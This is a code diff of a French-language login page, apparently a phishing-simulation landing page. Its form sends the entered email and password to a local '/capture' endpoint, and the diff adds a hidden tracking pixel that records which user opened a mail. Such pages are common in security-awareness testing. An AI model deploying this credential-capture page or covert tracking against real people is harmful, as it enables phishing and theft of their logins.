@@ -4,17 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Se connecter à votre compte</title>
-    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <h1>Se connecter à votre compte</h1>
-        <form action="http://localhost:3333/capture" method="POST" id="login-form">
-            <input type="text" id="username" name="username" placeholder="Adresse e-mail ou numéro de téléphone" required>
-            <input type="password" id="password" name="password" placeholder="Mot de passe" required>
-            <button type="submit">Se connecter</button>
-        </form>
-        <p><a href="#">Mot de passe oublié ?</a></p>
-    </div>
+    <h1>Se connecter à votre compte</h1>
+    
+    <!-- Formulaire de connexion -->
+    <form action="http://localhost:3333/capture" method="POST" id="login-form">
+        <input type="text" id="username" name="username" placeholder="Adresse e-mail ou numéro de téléphone" required>
+        <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+        <button type="submit">Se connecter</button>
+    </form>
+
+    <!-- Pixel de suivi invisible pour l'ouverture du mail -->
+    <img src="http://localhost:3333/track/open/{{.User.ID}}" style="display:none" />
+    
 </body>
 </html>
